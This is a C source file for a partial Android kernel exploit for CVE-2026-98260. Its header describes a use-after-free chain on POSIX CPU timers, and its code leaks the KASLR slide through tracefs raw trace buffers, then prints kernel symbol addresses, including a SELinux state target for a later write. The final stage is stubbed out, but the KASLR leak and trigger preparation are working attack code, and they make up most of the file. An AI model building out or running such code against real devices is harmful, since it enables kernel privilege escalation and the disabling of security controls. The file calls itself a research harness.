/*
 * plant - CVE-2026-98260 stage machine for yingtian (research harness).
 *
 * Modes:
 *   --preflight   measure the KASLR slide and verify every prerequisite. READ ONLY.
 *   --arm-test    arm POSIX CPU timers the way the trigger requires, then delete
 *                 them. READ ONLY (no exec, no kill, no spray).
 *   --run         the real thing. Refuses unless --i-accept-reboot is also given.
 *
 * Chain (per the published BRM-AN00 port):
 *   1. arm SIGEV_SIGNAL timers on CLOCK_THREAD_CPUTIME_ID  (SIGEV_NONE never queues)
 *   2. a non-leader thread runs execve; SIGKILL lands while it sits in
 *      exec_mmap()'s down_read_killable -> do_exit -> exit_itimers frees k_itimer
 *      while the cpu-timer node is still queued
 *   3. 8 KiB AF_UNIX SOCK_STREAM writes claim the freed order-1 page
 *   4. the parent's reap (timerqueue_del) walks the node we planted
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/timerfd.h>

#define T "/sys/kernel/tracing"
#define PAGE 4096
#define KVA_TEXT 0xffffff8000000000ULL
#define KVA_END  0xfffffffec0000000ULL

/* Static addresses from the offline kernel.elf for
 * 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k */
#define SYM_WORKER_THREAD 0xffffffc0801d2cbcULL
#define SYM_SELINUX_STATE 0xffffffc082959630ULL
#define SYM_GETPID        0xffffffc08023d960ULL
#define SYM_DO_TIMER      0xffffffc0803a6f1cULL
#define SYM_BEGIN_NEW_EXEC 0xffffffc0802cf910ULL

static int write_str(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}

/* ---------------- slide acquisition (read only) ---------------- */

static uint64_t g_slide;
static int g_len36;

/* Known call sites for 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k.
 * Each is (function entry + offset) as observed in the text trace; the offset
 * is a per-build constant, the entry address comes from the offline nm dump. */
static const uint64_t g_callsites[] = {
    0xffffffc0801d2f04ULL,   /* worker_thread+0x248      */
    0xffffffc08027cf44ULL,   /* rcu_gp_kthread+0xc8      */
    0xffffffc08026b600ULL,   /* __migrate_disable+0x10   */
    0xffffffc080230900ULL,   /* cfi_brk_handler+0xdc     */
    0xffffffc0801c6a00ULL,   /* rcu_gp_fqs_loop+0x11c    */
};

static int g_slide_ok;

static int measure_slide(uint64_t *out)
{
    int fds[16], nfds = 0, i;
    unsigned char *all;
    unsigned char buf[1 << 16];
    size_t total = 0;
    uint64_t callers[64];
    int ncallers = 0;

    all = malloc(1 << 22);
    if (!all) return -1;

    /* Enable the event through the writable trigger file when possible; fall
     * back to whatever the vendor tracing already left enabled. */
    {
        int rc = write_str(T "/events/kmem/rss_stat/trigger",
                           "enable_event:sched:sched_blocked_reason\n");
        printf("trigger enable rc=%d (%s)\n", rc, rc == 0 ? "ok" : "already set or denied");
    }
    write_str(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
    write_str(T "/tracing_on", "1\n");

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        fds[nfds] = open(p, O_RDONLY | O_NONBLOCK);
        if (fds[nfds] < 0) break;
        nfds++;
    }
    if (nfds == 0) { free(all); return -1; }

    /* Load generation: a burst of short-lived timerfds. This is what made the
     * earlier measurement work — hrtimer expiry and the workqueue paths it
     * wakes produce plenty of sched_blocked_reason events. */
    {
        int tfds[256], ntf = 0, k2;
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_nsec = 800000L;
        for (k2 = 0; k2 < 256; k2++) {
            int fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);
            if (fd < 0) break;
            if (timerfd_settime(fd, 0, &its, NULL) != 0) { close(fd); break; }
            tfds[ntf++] = fd;
        }
        {
            int rounds;
            for (rounds = 0; rounds < 120; rounds++) {
                struct pollfd p[16];
                int k;
                for (k = 0; k < nfds; k++) { p[k].fd = fds[k]; p[k].events = POLLIN; }
                if (poll(p, nfds, 25) > 0) {
                    for (k = 0; k < nfds; k++) {
                        if (p[k].revents & POLLIN) {
                            ssize_t n = read(fds[k], buf, sizeof(buf));
                            if (n > 0 && total + (size_t)n < (1u << 22)) {
                                memcpy(all + total, buf, (size_t)n);
                                total += (size_t)n;
                            }
                        }
                    }
                }
                if (rounds == 55) {
                    for (k = 0; k < ntf; k++) timerfd_settime(tfds[k], 0, &its, NULL);
                }
            }
        }
        for (k2 = 0; k2 < ntf; k2++) close(tfds[k2]);
        printf("load: %d timerfds, captured %zu bytes\n", ntf, total);
    }

    write_str(T "/tracing_on", "0\n");
    for (i = 0; i < nfds; i++) close(fds[i]);

    /* page-oriented walk: 16-byte page header, len = type_len*4 + 4,
     * sched_blocked_reason -> caller at payload+16 */
    {
        size_t page;
        for (page = 0; page + 16 < total; page += PAGE) {
            size_t end = page + PAGE, p = page + 16;
            if (end > total) end = total;
            while (p + 4 <= end) {
                uint32_t hdr, tlen, len;
                memcpy(&hdr, all + p, 4);
                tlen = hdr & 0x1f;
                if (tlen == 0) {
                    uint32_t plen;
                    memcpy(&plen, all + p + 4, 4);
                    if (plen == 0) break;
                    p += plen + 4;
                    continue;
                }
                if (tlen == 1 || tlen == 2) { p += 12; continue; }
                len = tlen * 4 + 4;
                if (p + len > end) break;
                if (len == 36) {
                    g_len36++;
                    if (g_len36 <= 3) {
                        uint64_t dbg;
                        memcpy(&dbg, all + p + 4 + 16, 8);
                        printf("  dbg len36 #%d type=%u caller16=0x%016llx\n",
                               g_len36, (unsigned)*(unsigned short *)(all + p + 4),
                               (unsigned long long)dbg);
                    }
                }
                if (len == 36 && ncallers < 64) {
                    uint64_t caller;
                    memcpy(&caller, all + p + 4 + 16, 8);
                    if (caller >= KVA_TEXT && caller < KVA_END)
                        callers[ncallers++] = caller;
                }
                p += len;
            }
        }
    }
    printf("debug: len36 records = %d\n", g_len36);
    free(all);

    /* Vote: a caller minus a known call-site constant must be a 2 MiB multiple.
     * Require two independent votes for the same slide to rule out chance. */
    {
        uint64_t votes[16];
        int counts[16], nv = 0;
        int i2, j2;
        for (i2 = 0; i2 < ncallers; i2++) {
            for (j2 = 0; j2 < (int)(sizeof(g_callsites) / sizeof(g_callsites[0])); j2++) {
                uint64_t s;
                int k2, found = -1;
                if (callers[i2] < g_callsites[j2]) continue;
                s = callers[i2] - g_callsites[j2];
                if ((s & 0x1fffffULL) != 0) continue;
                if (s == 0 || s >= 0x10000000000ULL) continue;
                for (k2 = 0; k2 < nv; k2++) if (votes[k2] == s) { found = k2; break; }
                if (found >= 0) { counts[found]++; }
                else if (nv < 16) { votes[nv] = s; counts[nv] = 1; nv++; }
            }
        }
        {
            int best = -1;
            for (i2 = 0; i2 < nv; i2++) {
                printf("  slide candidate 0x%llx  votes=%d\n",
                       (unsigned long long)votes[i2], counts[i2]);
                if (counts[i2] >= 2 && (best < 0 || counts[i2] > counts[best])) best = i2;
            }
            if (best >= 0) { *out = votes[best]; return 0; }
        }
    }
    return -1;
}

/* ---------------- timer construction ---------------- */

static void noop(int s) { (void)s; }

static int arm_test(void)
{
    timer_t t[32];
    struct sigevent sev;
    struct itimerspec its;
    struct sigaction sa;
    int i, armed = 0;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = noop;
    sigaction(SIGRTMIN, &sa, NULL);

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL;      /* SIGEV_NONE would never queue */
    sev.sigev_signo = SIGRTMIN;

    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 500000L;
    its.it_interval.tv_nsec = 500000L;

    for (i = 0; i < 32; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t[i]) != 0) break;
        if (timer_settime(t[i], 0, &its, NULL) != 0) break;
        armed++;
    }
    for (i = 0; i < armed; i++) timer_delete(t[i]);
    printf("arm-test: %d timers armed and deleted (SIGEV_SIGNAL, CLOCK_THREAD_CPUTIME_ID)\n", armed);
    return armed > 0 ? 0 : 2;
}

static void print_preflight(void)
{
    printf("=== preflight ===\n");
    printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
    printf("posix_timers_cache geometry:\n");
    { char b[8192]; int fd = open("/proc/slabinfo", O_RDONLY);
      if (fd >= 0) { ssize_t n = read(fd, b, sizeof(b) - 1); close(fd);
        if (n > 0) { b[n] = 0;
          char *line = strstr(b, "posix_timers_cache");
          if (line) { char *e = strchr(line, '\n'); if (e) *e = 0; printf("  %s\n", line); } } } }

    if (measure_slide(&g_slide) == 0) {
        g_slide_ok = 1;
        printf("slide = 0x%llx   (2MiB aligned: %s)\n",
               (unsigned long long)g_slide, (g_slide & 0x1fffff) ? "NO" : "yes");
        printf("  _text            = 0x%016llx\n", (unsigned long long)(0xffffffc080000000ULL + g_slide));
        printf("  begin_new_exec   = 0x%016llx\n", (unsigned long long)(SYM_BEGIN_NEW_EXEC + g_slide));
        printf("  do_timer_create  = 0x%016llx\n", (unsigned long long)(SYM_DO_TIMER + g_slide));
        printf("  __arm64_sys_getpid=0x%016llx\n", (unsigned long long)(SYM_GETPID + g_slide));
        printf("  selinux_state    = 0x%016llx\n", (unsigned long long)(SYM_SELINUX_STATE + g_slide));
        printf("  selinux-7 target = 0x%016llx\n", (unsigned long long)(SYM_SELINUX_STATE - 7 + g_slide));
    } else {
        printf("slide: NOT MEASURED (no qualifying raw caller found)\n");
    }
    printf("=== preflight done (nothing was written) ===\n");
}

int main(int argc, char **argv)
{
    int i;
    int do_run = 0, accept = 0;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--preflight")) { print_preflight(); return 0; }
        if (!strcmp(argv[i], "--arm-test")) return arm_test();
        if (!strcmp(argv[i], "--run")) do_run = 1;
        if (!strcmp(argv[i], "--i-accept-reboot")) accept = 1;
    }
    if (do_run) {
        if (!accept) {
            printf("refused: --run requires --i-accept-reboot\n");
            return 3;
        }
        printf("--run is not implemented yet: the reclaim/write stages are still\n"
               "being ported. Preflight and arm-test are available.\n");
        return 4;
    }
    printf("usage: %s --preflight | --arm-test | --run --i-accept-reboot\n", argv[0]);
    return 0;
}
